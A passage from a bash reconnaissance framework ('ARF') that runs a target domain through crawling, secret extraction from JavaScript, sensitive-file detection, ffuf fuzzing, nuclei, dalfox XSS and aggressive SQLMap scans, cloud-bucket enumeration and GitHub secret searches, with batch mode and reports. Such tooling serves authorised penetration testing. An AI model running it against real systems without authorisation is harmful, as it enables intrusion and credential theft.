        -ports 80,443,8080,8000,8888,8443,3000,4000,5000 \
        -title -tech-detect -status-code -content-length \
        -follow-redirects -random-agent \
        -timeout "$TIMEOUT" \
        -o urls/alive.txt 2>/dev/null || true
    
    # FIXED: Use grep -E instead of grep -P for portability
    grep -oE 'https?://[^[:space:]]+' urls/alive.txt | sort -u > urls/alive_urls.txt 2>/dev/null || true
    
    # Technology detection
    if command -v whatweb &>/dev/null; then
        info "Running whatweb for technology detection..."
        head -20 urls/alive_urls.txt | while read -r url; do
            whatweb -a 3 "$url" 2>/dev/null >> urls/tech_detect.txt || true
        done
    fi
    
    local count=$(wc -l < urls/alive.txt 2>/dev/null || echo 0)
    success "Alive hosts: $count"
}

# ─── CRAWLING & URL DISCOVERY ────────────────────────────────────────────────
discover_urls() {
    section "🕷️ URL DISCOVERY & CRAWLING"
    mkdir -p urls
    
    info "Running katana..."
    katana -list urls/alive_urls.txt \
        -d "$CRAWL_DEPTH" \
        -jc -silent \
        -timeout "$TIMEOUT" \
        -o urls/katana.txt 2>/dev/null || true
    
    info "Running gospider..."
    command -v gospider &>/dev/null && \
        gospider -S urls/alive_urls.txt -d "$CRAWL_DEPTH" -q \
        -o urls/gospider_raw 2>/dev/null && \
        find urls/gospider_raw -type f -exec cat {} \; 2>/dev/null | \
        grep -oE 'https?://[^[:space:]]+' >> urls/katana.txt || true
    
    info "Running hakrawler..."
    command -v hakrawler &>/dev/null && \
        cat urls/alive_urls.txt | hakrawler -d "$CRAWL_DEPTH" -t "$THREADS" \
        >> urls/katana.txt 2>/dev/null || true
    
    # Archive sources
    info "Fetching from Wayback Machine..."
    waybackurls "$TARGET" >> urls/katana.txt 2>/dev/null || true
    
    info "Fetching from GAU..."
    gau "$TARGET" --subs --threads 10 >> urls/katana.txt 2>/dev/null || true
    
    # Merge and deduplicate
    cat urls/katana.txt | sort -u > urls/all_urls.txt || true
    
    local count=$(wc -l < urls/all_urls.txt 2>/dev/null || echo 0)
    success "Total unique URLs: $count"
}

# ─── JAVASCRIPT & SENSITIVE FILE ANALYSIS ────────────────────────────────────
analyze_js_files() {
    section "🎯 JAVASCRIPT & SENSITIVE FILE ANALYSIS"
    mkdir -p js
    
    # Extract JS files
    grep -E "\.js(\?|$)" urls/all_urls.txt | sort -u > js/js_files.txt || true
    
    # Extract sensitive files
    grep -iE "\.(env|json|log|bak|backup|db|sql|config|xml|yaml|yml|conf|key|pem|p12|zip|tar|gz|7z|rar)(\?|$)" \
        urls/all_urls.txt | sort -u > js/sensitive_files.txt || true
    
    # Extract secrets from JS - FIXED: Check if nuclei-templates exists
    if command -v nuclei &>/dev/null && [[ -s js/js_files.txt ]]; then
        info "Scanning JS files for secrets..."
        local nuclei_templates="${HOME}/nuclei-templates"
        if [[ -d "$nuclei_templates" ]]; then
            nuclei -l js/js_files.txt \
                -t "$nuclei_templates/exposures/tokens/" \
                -t "$nuclei_templates/exposures/apis/" \
                -silent -o js/js_secrets.txt 2>/dev/null || true
        else
            warn "Nuclei templates not found at $nuclei_templates"
        fi
    fi
    
    # Download and analyze JS files
    if [[ -s js/js_files.txt ]]; then
        info "Downloading JS files for analysis..."
        mkdir -p js/downloads
        head -20 js/js_files.txt | while read -r url; do
            curl -s "$url" -o "js/downloads/$(basename "$url")" 2>/dev/null || true
        done
        
        # Extract potential secrets
        grep -rhoE "(api[_-]?key|secret|password|token|auth)[\"']?\s*[:=]\s*[\"'][^\"']+[\"']" \
            js/downloads/ 2>/dev/null | sort -u > js/potential_secrets.txt || true
    fi
    
    success "JS files: $(wc -l < js/js_files.txt 2>/dev/null || echo 0)"
    success "Sensitive files: $(wc -l < js/sensitive_files.txt 2>/dev/null || echo 0)"
}

# ─── PARAMETER DISCOVERY ─────────────────────────────────────────────────────
discover_parameters() {
    section "🧪 PARAMETER DISCOVERY"
    mkdir -p fuzz
    
    # Extract params from URLs
    grep "=" urls/all_urls.txt | grep -v "^#" | sort -u > fuzz/params_raw.txt || true
    
    # FIXED: Use grep -E instead of grep -P
    grep -oE '[?&][^=&]+=' fuzz/params_raw.txt | tr -d '?&=' | sort -u > fuzz/param_names.txt || true
    
    # FFUF parameter discovery
    if command -v ffuf &>/dev/null && [[ -f "$PARAM_WORDLIST" && -s urls/alive_urls.txt ]]; then
        info "Running FFUF parameter discovery..."
        head -20 urls/alive_urls.txt | while read -r url; do
            host=$(echo "$url" | awk -F/ '{print $3}')
            ffuf -u "${url}?FUZZ=1" \
                -w "$PARAM_WORDLIST" \
                -fc 404 -ac -t 50 -silent \
                -o "fuzz/params_${host}.json" -of json 2>/dev/null || true
        done
    fi
    
    success "Parameters found: $(wc -l < fuzz/params_raw.txt 2>/dev/null || echo 0)"
}

# ─── DIRECTORY FUZZING ───────────────────────────────────────────────────────
fuzz_directories() {
    section "🔀 DIRECTORY FUZZING"
    
    if command -v ffuf &>/dev/null && [[ -f "$DIR_WORDLIST" && -s urls/alive_urls.txt ]]; then
        info "Fuzzing directories on top hosts..."
        head -30 urls/alive_urls.txt | while read -r url; do
            host=$(echo "$url" | awk -F/ '{print $3}')
            ffuf -u "${url}/FUZZ" \
                -w "$DIR_WORDLIST" \
                -fc 404,403 -ac -t 100 \
                -recursion -recursion-depth 2 \
                -silent \
                -o "fuzz/dirs_${host}.json" -of json 2>/dev/null || true
        done
        success "Directory fuzzing complete"
    fi
}

# ─── VHOST FUZZING ───────────────────────────────────────────────────────────
fuzz_vhosts() {
    section "🌐 VHOST DISCOVERY"
    
    if command -v ffuf &>/dev/null && [[ -f "$VHOST_WORDLIST" ]]; then
        info "Fuzzing virtual hosts..."
        ffuf -u "https://$TARGET" \
            -w "$VHOST_WORDLIST" \
            -H "Host: FUZZ.$TARGET" \
            -fc 404,400 -ac -t 100 \
            -silent \
            -o fuzz/vhosts.json -of json 2>/dev/null || true
        success "VHost fuzzing complete"
    fi
}

# ─── VULNERABILITY SCANNING ──────────────────────────────────────────────────
scan_vulnerabilities() {
    section "🐛 VULNERABILITY SCANNING"
    mkdir -p vulns
    
    # Nuclei scan - FIXED: Check if nuclei-templates exists
    if command -v nuclei &>/dev/null && [[ -s urls/alive_urls.txt ]]; then
        info "Running nuclei vulnerability scan..."
        local nuclei_templates="${HOME}/nuclei-templates"
        if [[ -d "$nuclei_templates" ]]; then
            nuclei -l urls/alive_urls.txt \
                -t "$nuclei_templates" \
                -severity critical,high,medium \
                -rate-limit "$RATE_LIMIT" \
                -concurrency "$THREADS" \
                -timeout "$TIMEOUT" \
                -stats \
                -o vulns/nuclei.txt 2>/dev/null || true
        else
            nuclei -l urls/alive_urls.txt \
                -severity critical,high,medium \
                -rate-limit "$RATE_LIMIT" \
                -concurrency "$THREADS" \
                -timeout "$TIMEOUT" \
                -stats \
                -o vulns/nuclei.txt 2>/dev/null || true
        fi
        
        # Separate by severity
        grep -i "\[critical\]" vulns/nuclei.txt > vulns/nuclei_critical.txt 2>/dev/null || true
        grep -i "\[high\]" vulns/nuclei.txt > vulns/nuclei_high.txt 2>/dev/null || true
        grep -i "\[medium\]" vulns/nuclei.txt > vulns/nuclei_medium.txt 2>/dev/null || true
        
        success "Nuclei findings: $(wc -l < vulns/nuclei.txt 2>/dev/null || echo 0)"
    fi
    
    # XSS scanning
    if command -v dalfox &>/dev/null && [[ -s fuzz/params_raw.txt ]]; then
        info "Scanning for XSS with dalfox..."
        dalfox file fuzz/params_raw.txt \
            --skip-bav \
            --no-spinner \
            -w "$THREADS" \
            -o vulns/xss.txt 2>/dev/null || true
        success "XSS scan complete"
    fi
    
    # Subdomain takeover
    if command -v subzy &>/dev/null; then
        info "Checking subdomain takeover..."
        subzy run --targets subs/all_subs.txt \
            --concurrency 50 \
            --hide-fails \
            > vulns/takeover.txt 2>/dev/null || true
        success "Takeover results: $(wc -l < vulns/takeover.txt 2>/dev/null || echo 0)"
    fi
    
    # SQLMap (if aggressive mode)
    if command -v sqlmap &>/dev/null && [[ "$AGGRESSIVE" == "true" && -s fuzz/params_raw.txt ]]; then
        warn "Running SQLMap (aggressive mode)..."
        head -5 fuzz/params_raw.txt | while read -r url; do
            sqlmap -u "$url" --batch --level 2 --risk 2 \
                -o "vulns/sqlmap_$(echo $url | md5sum | cut -d' ' -f1).txt" 2>/dev/null || true
        done
    fi
}

# ─── SCREENSHOT CAPTURE ──────────────────────────────────────────────────────
capture_screenshots() {
    section "📸 SCREENSHOT CAPTURE"
    
    if command -v gowitness &>/dev/null && [[ -s urls/alive_urls.txt ]]; then
        info "Capturing screenshots with gowitness..."
        mkdir -p screenshots
        gowitness file -f urls/alive_urls.txt \
            --path screenshots \
            --port 443,80 \
            --timeout 10 \
            2>/dev/null || true
        success "Screenshots saved to: screenshots/"
    fi
}

# ─── CLOUD BUCKET ENUMERATION ────────────────────────────────────────────────
enumerate_cloud_buckets() {
    section "☁️ CLOUD BUCKET ENUMERATION"
    mkdir -p cloud
    
    info "Checking for S3 buckets..."
    for variant in "$TARGET" "${TARGET//./-}" "${TARGET//./_}"; do
        curl -s -I "https://$variant.s3.amazonaws.com" 2>/dev/null | \
            grep -q "200 OK" && echo "$variant.s3.amazonaws.com" >> cloud/s3_buckets.txt || true
    done
    
    info "Checking for Azure blobs..."
    for variant in "$TARGET" "${TARGET//./-}"; do
        curl -s -I "https://$variant.blob.core.windows.net" 2>/dev/null | \
            grep -q "200 OK" && echo "$variant.blob.core.windows.net" >> cloud/azure_blobs.txt || true
    done
    
    info "Checking for GCS buckets..."
    for variant in "$TARGET" "${TARGET//./-}"; do
        curl -s -I "https://storage.googleapis.com/$variant" 2>/dev/null | \
            grep -q "200 OK" && echo "storage.googleapis.com/$variant" >> cloud/gcs_buckets.txt || true
    done
    
    [[ -f cloud/s3_buckets.txt ]] && success "S3 buckets: $(wc -l < cloud/s3_buckets.txt)"
    [[ -f cloud/azure_blobs.txt ]] && success "Azure blobs: $(wc -l < cloud/azure_blobs.txt)"
    [[ -f cloud/gcs_buckets.txt ]] && success "GCS buckets: $(wc -l < cloud/gcs_buckets.txt)"
}

# ─── GITHUB DORKING ──────────────────────────────────────────────────────────
github_dorking() {
    section "🐙 GITHUB RECONNAISSANCE"
    
    if [[ -n "$GITHUB_TOKEN" ]]; then
        info "Searching GitHub for exposed secrets..."
        mkdir -p github
        
        # Search for target in code
        curl -s "https://api.github.com/search/code?q=$TARGET+in:path" \
            -H "Authorization: token $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" 2>/dev/null | \
            jq -r '.items[].html_url' > github/code_mentions.txt 2>/dev/null || true
        
        # Search for potential secrets
        curl -s "https://api.github.com/search/code?q=$TARGET+api_key+OR+password+OR+secret" \
            -H "Authorization: token $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" 2>/dev/null | \
            jq -r '.items[].html_url' > github/potential_leaks.txt 2>/dev/null || true
        
        [[ -s github/code_mentions.txt ]] && success "GitHub mentions: $(wc -l < github/code_mentions.txt)"
        [[ -s github/potential_leaks.txt ]] && warn "Potential leaks: $(wc -l < github/potential_leaks.txt)"
    else
        info "GitHub token not provided - skipping GitHub dorking"
    fi
}

# ─── REPORT GENERATION ───────────────────────────────────────────────────────
generate_report() {
    section "📊 REPORT GENERATION"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local report_dir="reports"
    mkdir -p "$report_dir"
    
    # FIXED: Safe file count function
    count_lines() {
        [[ -f "$1" ]] && wc -l < "$1" 2>/dev/null || echo 0
    }
    
    # Text report
    local text_report="$report_dir/summary_${timestamp}.txt"
    cat > "$text_report" << EOF
════════════════════════════════════════════════════════════════════════════
RECONNAISSANCE REPORT — $TARGET
Generated: $(date)
Script Version: $VERSION
════════════════════════════════════════════════════════════════════════════
[SUBDOMAINS]
Total unique      : $(count_lines subs/all_subs.txt)
DNS-validated     : $(count_lines subs/all_subs.txt)
[HOSTS]
Alive             : $(count_lines urls/alive.txt)
[URLS]
Total discovered  : $(count_lines urls/all_urls.txt)
JS files          : $(count_lines js/js_files.txt)
Sensitive files   : $(count_lines js/sensitive_files.txt)
Parameters found  : $(count_lines fuzz/params_raw.txt)
[VULNERABILITIES]
Nuclei (total)    : $(count_lines vulns/nuclei.txt)
↳ Critical        : $(count_lines vulns/nuclei_critical.txt)
↳ High            : $(count_lines vulns/nuclei_high.txt)
↳ Medium          : $(count_lines vulns/nuclei_medium.txt)
XSS (dalfox)      : $(count_lines vulns/xss.txt)
Takeover          : $(count_lines vulns/takeover.txt)
[CLOUD]
S3 buckets        : $(count_lines cloud/s3_buckets.txt)
Azure blobs       : $(count_lines cloud/azure_blobs.txt)
GCS buckets       : $(count_lines cloud/gcs_buckets.txt)
[GITHUB]
Code mentions     : $(count_lines github/code_mentions.txt)
Potential leaks   : $(count_lines github/potential_leaks.txt)
[OUTPUT FILES]
subs/all_subs.txt           — all validated subdomains
urls/alive.txt              — live hosts with metadata
urls/all_urls.txt           — all discovered URLs
js/js_files.txt             — JS endpoints
js/sensitive_files.txt      — sensitive file leaks
js/js_secrets.txt           — secrets found in JS
fuzz/params_raw.txt         — parameterised URLs
fuzz/dirs_*.json            — directory fuzzing results
fuzz/vhosts.json            — virtual host fuzzing
vulns/nuclei.txt            — all nuclei findings
vulns/xss.txt               — XSS findings
vulns/takeover.txt          — takeover candidates
cloud/*.txt                 — cloud bucket findings
github/*.txt                — GitHub recon findings
[LOG]
Full log        : $LOG_FILE
════════════════════════════════════════════════════════════════════════════
EOF
    
    # JSON report - FIXED: Ensure valid JSON even if files missing
    if [[ "$JSON_REPORT" == "true" ]]; then
        local json_report="$report_dir/summary_${timestamp}.json"
        cat > "$json_report" << EOF
{
    "target": "$TARGET",
    "timestamp": "$(date -Iseconds)",
    "version": "$VERSION",
    "subdomains": $(count_lines subs/all_subs.txt),
    "alive_hosts": $(count_lines urls/alive.txt),
    "urls": $(count_lines urls/all_urls.txt),
    "vulnerabilities": {
        "nuclei_total": $(count_lines vulns/nuclei.txt),
        "critical": $(count_lines vulns/nuclei_critical.txt),
        "high": $(count_lines vulns/nuclei_high.txt),
        "medium": $(count_lines vulns/nuclei_medium.txt),
        "xss": $(count_lines vulns/xss.txt),
        "takeover": $(count_lines vulns/takeover.txt)
    }
}
EOF
        success "JSON report: $json_report"
    fi
    
    # HTML report - FIXED: CSS class names with dots
    if [[ "$HTML_REPORT" == "true" ]]; then
        local html_report="$report_dir/summary_${timestamp}.html"
        cat > "$html_report" << EOF
<!DOCTYPE html>
<html><head><title>Recon Report - $TARGET</title>
<style>body{font-family:monospace;background:#1a1a2e;color:#eee;padding:20px}
h1{color:#00d9ff}h2{color:#00ff88}.stat{background:#16213e;padding:10px;margin:5px}
.critical{color:#ff4444}.high{color:#ff8800}.medium{color:#ffcc00}</style></head>
<body>
<h1>🔍 Reconnaissance Report</h1>
<h2>Target: $TARGET</h2>
<p>Generated: $(date)</p>
<div class="stat"><h3>Subdomains: $(count_lines subs/all_subs.txt)</h3></div>
<div class="stat"><h3>Alive Hosts: $(count_lines urls/alive.txt)</h3></div>
<div class="stat"><h3>URLs: $(count_lines urls/all_urls.txt)</h3></div>
<div class="stat"><h3 class="critical">Critical: $(count_lines vulns/nuclei_critical.txt)</h3></div>
<div class="stat"><h3 class="high">High: $(count_lines vulns/nuclei_high.txt)</h3></div>
<div class="stat"><h3 class="medium">Medium: $(count_lines vulns/nuclei_medium.txt)</h3></div>
</body></html>
EOF
        success "HTML report: $html_report"
    fi
    
    cat "$text_report"
    success "Report saved → $text_report"
}

# ─── NOTIFICATION ────────────────────────────────────────────────────────────
send_notification() {
    if [[ -n "$NOTIFY_CHANNEL" ]]; then
        case "$NOTIFY_CHANNEL" in
            slack)
                [[ -n "${SLACK_WEBHOOK:-}" ]] && \
                    curl -s -X POST -H 'Content-type: application/json' \
                    --data "{\"text\":\"🔍 Recon complete for $TARGET - $(date)\"}" \
                    "$SLACK_WEBHOOK" 2>/dev/null || true
                ;;
            discord)
                [[ -n "${DISCORD_WEBHOOK:-}" ]] && \
                    curl -s -X POST -H 'Content-type: application/json' \
                    --data "{\"content\":\"🔍 Recon complete for $TARGET - $(date)\"}" \
                    "$DISCORD_WEBHOOK" 2>/dev/null || true
                ;;
            telegram)
                [[ -n "${TELEGRAM_BOT_TOKEN:-}" && -n "${TELEGRAM_CHAT_ID:-}" ]] && \
                    curl -s "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                    -d "chat_id=${TELEGRAM_CHAT_ID}&text=🔍 Recon complete for $TARGET" 2>/dev/null || true
                ;;
        esac
        info "Notification sent via $NOTIFY_CHANNEL"
    fi
}

# ─── SINGLE TARGET RECON ─────────────────────────────────────────────────────
run_single_target() {
    local target="$1"
    local original_target="$TARGET"  # FIXED: Preserve original TARGET
    
    # Setup output directory
    local target_outdir="${OUTDIR:-recon_${target}_$(date +%Y%m%d_%H%M%S)}"
    mkdir -p "$target_outdir"/{subs,urls,vulns,fuzz,js,cloud,github,reports,screenshots}
    
    # FIXED: Check cd succeeded
    cd "$target_outdir" || error "Failed to change to output directory: $target_outdir"
    
    # Setup logging - FIXED: Set LOG_FILE before any logging
    LOG_FILE="$target_outdir/../${target}_recon.log"
    
    # Display banner
    cat << EOF
${COLORS[BOLD]}${COLORS[CYAN]}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥 ADVANCED RECONNAISSANCE FRAMEWORK v${VERSION}            ║
║   🎯 Target: $target
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
${COLORS[RESET]}
EOF
    
    success "Target: $target"
    success "Threads: $THREADS"
    success "Output: $target_outdir"
    success "Log: $LOG_FILE"
    
    # Check for resume - FIXED: Better resume logic
    if [[ -n "$RESUME_ID" && -d "$RESUME_ID" ]]; then
        warn "Resuming from: $RESUME_ID"
        cd "$RESUME_ID" || error "Failed to change to resume directory: $RESUME_ID"
    fi
    
    # Installation check (only once for batch)
    [[ "${SKIP_INSTALL:-false}" != "true" && -z "${TOOLS_INSTALLED:-}" ]] && {
        check_and_install_tools
        TOOLS_INSTALLED=true
    }
    
    # Setup
    setup_wordlists
    
    # WAF Detection & Bypass
    if [[ "$WAF_BYPASS" == "true" ]]; then
        detect_waf && waf_bypass_techniques
    fi
    
    # Reconnaissance phases
    enumerate_subdomains
    scan_ports
    check_alive_hosts
    discover_urls
    analyze_js_files
    discover_parameters
    fuzz_directories
    fuzz_vhosts
    scan_vulnerabilities
    capture_screenshots
    enumerate_cloud_buckets
    github_dorking
    
    # Reporting
    generate_report
    
    # Notification
    send_notification
    
    success "═══════════════════════════════════════════════════════════════"
    success " Reconnaissance complete for $target"
    success " All data saved in: $target_outdir"
    success "═══════════════════════════════════════════════════════════════"
    
    # FIXED: Check cd succeeded
    cd "$SCRIPT_DIR" || error "Failed to return to script directory"
    
    TARGET="$original_target"  # FIXED: Restore original TARGET
}

# ─── BATCH TARGET RECON ──────────────────────────────────────────────────────
run_batch_targets() {
    local targets_file="$1"
    OUTDIR_BASE="${OUTDIR:-recon_batch_$(date +%Y%m%d_%H%M%S)}"
    mkdir -p "$OUTDIR_BASE"
    
    # Parse targets
    mapfile -t TARGETS < <(parse_targets_file "$targets_file")
    local total=${#TARGETS[@]}
    
    if [[ $total -eq 0 ]]; then
        error "No valid targets found in file: $targets_file"
    fi
    
    # Display banner
    cat << EOF
${COLORS[BOLD]}${COLORS[CYAN]}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥 ADVANCED RECONNAISSANCE FRAMEWORK v${VERSION}            ║
║   📁 BATCH MODE - Multiple Targets                           ║
║   📊 Total Targets: $total                                    ║
║   🔀 Parallel: $PARALLEL_TARGETS                              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
${COLORS[RESET]}
EOF
    
    success "Targets loaded: $total"
    success "Output base: $OUTDIR_BASE"
    success "Parallel processing: $PARALLEL_TARGETS"
    
    # Install tools once for all targets
    [[ "${SKIP_INSTALL:-false}" != "true" ]] && check_and_install_tools
    TOOLS_INSTALLED=true
    
    # Process targets - FIXED: Note that parallel not fully implemented
    local completed=0
    local skipped=0
    local failed=0
    
    for target in "${TARGETS[@]}"; do
        ((completed++))
        
        # Check if already completed
        if [[ "$SKIP_DONE" == "true" ]] && is_target_completed "$target"; then
            warn "[$completed/$total] Skipping (already completed): $target"
            ((skipped++))
            continue
        fi
        
        info "${COLORS[BOLD]}${COLORS[MAGENTA]}[$completed/$total] Processing:${COLORS[RESET]} $target"
        
        # Run single target recon
        if run_single_target "$target"; then
            success "[$completed/$total] Completed: $target"
        else
            error "[$completed/$total] Failed: $target"
            ((failed++))
        fi
        
        # Summary after each target
        echo -e "${COLORS[DIM]}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${COLORS[RESET]}"
        echo -e "${COLORS[GREEN]}Completed: $((completed - skipped - failed)) | Skipped: $skipped | Failed: $failed | Remaining: $((total - completed))${COLORS[RESET]}"
        echo -e "${COLORS[DIM]}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${COLORS[RESET]}"
    done
    
    # Final summary
    section "📊 BATCH RECON SUMMARY"
    success "Total targets: $total"
    success "Completed: $((completed - skipped - failed))"
    warn "Skipped: $skipped"
    error "Failed: $failed" 2>/dev/null || true
    success "All data saved in: $OUTDIR_BASE"
    
    # Generate master report
    generate_master_report "$OUTDIR_BASE" "$total" "$completed" "$skipped" "$failed"
    
    # Send notification
    if [[ -n "$NOTIFY_CHANNEL" ]]; then
        send_batch_notification "$total" "$completed" "$skipped" "$failed"
    fi
}

# ─── MASTER REPORT GENERATION ────────────────────────────────────────────────
generate_master_report() {
    local base_dir="$1"
    local total="$2"
    local completed="$3"
    local skipped="$4"
    local failed="$5"
    local master_report="$base_dir/MASTER_REPORT_$(date +%Y%m%d_%H%M%S).txt"
    
    # FIXED: Check bc exists before using
    local success_rate="N/A"
    if command -v bc &>/dev/null && [[ $total -gt 0 ]]; then
        success_rate="$(echo "scale=2; ($completed - $skipped - $failed) * 100 / $total" | bc)%"
    fi
    
    cat > "$master_report" << EOF
════════════════════════════════════════════════════════════════════════════
MASTER RECONNAISSANCE REPORT — BATCH SCAN
Generated: $(date)
Script Version: $VERSION
════════════════════════════════════════════════════════════════════════════
[BATCH SUMMARY]
Total targets     : $total
Completed         : $((completed - skipped - failed))
Skipped           : $skipped
Failed            : $failed
Success rate      : $success_rate
[TARGET DIRECTORIES]
EOF
    
    # List all target directories
    find "$base_dir" -maxdepth 1 -type d -name "recon_*" 2>/dev/null | while read -r dir; do
        echo "  → $(basename "$dir")" >> "$master_report"
    done
    
    cat >> "$master_report" << EOF
[INDIVIDUAL REPORTS]
EOF
    
    # Link to individual reports
    find "$base_dir" -name "summary_*.txt" 2>/dev/null | head -20 | while read -r report; do
        echo "  → $report" >> "$master_report"
    done
    
    cat >> "$master_report" << EOF
════════════════════════════════════════════════════════════════════════════
EOF
    
    success "Master report saved → $master_report"
}

# ─── BATCH NOTIFICATION ──────────────────────────────────────────────────────
send_batch_notification() {
    local total="$1"
    local completed="$2"
    local skipped="$3"
    local failed="$4"
    local message="🔍 Batch Recon Complete
📊 Total: $total
✅ Completed: $((completed - skipped - failed))
⏭️ Skipped: $skipped
❌ Failed: $failed"
    
    case "$NOTIFY_CHANNEL" in
        slack)
            [[ -n "${SLACK_WEBHOOK:-}" ]] && \
                curl -s -X POST -H 'Content-type: application/json' \
                --data "{\"text\":\"$message\"}" \
                "$SLACK_WEBHOOK" 2>/dev/null || true
            ;;
        discord)
            [[ -n "${DISCORD_WEBHOOK:-}" ]] && \
                curl -s -X POST -H 'Content-type: application/json' \
                --data "{\"content\":\"$message\"}" \
                "$DISCORD_WEBHOOK" 2>/dev/null || true
            ;;
        telegram)
            [[ -n "${TELEGRAM_BOT_TOKEN:-}" && -n "${TELEGRAM_CHAT_ID:-}" ]] && \
                curl -s "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                -d "chat_id=${TELEGRAM_CHAT_ID}&text=$message" 2>/dev/null || true
            ;;
    esac
}

# ─── MAIN EXECUTION ──────────────────────────────────────────────────────────
main() {
    # Handle help/version BEFORE sudo check for better UX
    if [[ "${1:-}" == "-h" ]] || [[ "${1:-}" == "--help" ]]; then
        show_help
        exit 0
    fi

    if [[ "${1:-}" == "-v" ]] || [[ "${1:-}" == "--version" ]]; then
        echo -e "${COLORS[BOLD]}🚀 ARF - Advanced Reconnaissance Framework${COLORS[RESET]}"
        echo -e "${COLORS[DIM]}Version:${COLORS[RESET]} ${VERSION}"
        echo
        echo -e "${COLORS[DIM]}Run:${COLORS[RESET]} ${COLORS[GREEN]}sudo arf --help${COLORS[RESET]} for usage"
        exit 0
    fi

    # Handle setup option
    if [[ "${1:-}" == "--setup" ]]; then
        if [[ -f "${SCRIPT_DIR}/setup.sh" ]]; then
            bash "${SCRIPT_DIR}/setup.sh"
            exit 0
        else
            error "setup.sh not found in ${SCRIPT_DIR}"
        fi
    fi

    # Require sudo for actual scanning
    enforce_sudo
    parse_args "$@"
    load_config
    load_api_keys

    if [[ -n "$TARGETS_FILE" ]]; then
        # Batch mode
        run_batch_targets "$TARGETS_FILE"
    else
        # Single target mode
        run_single_target "$TARGET"
    fi
}

# ─── ENTRY POINT ────────────────────────────────────────────────────────────
main "$@"
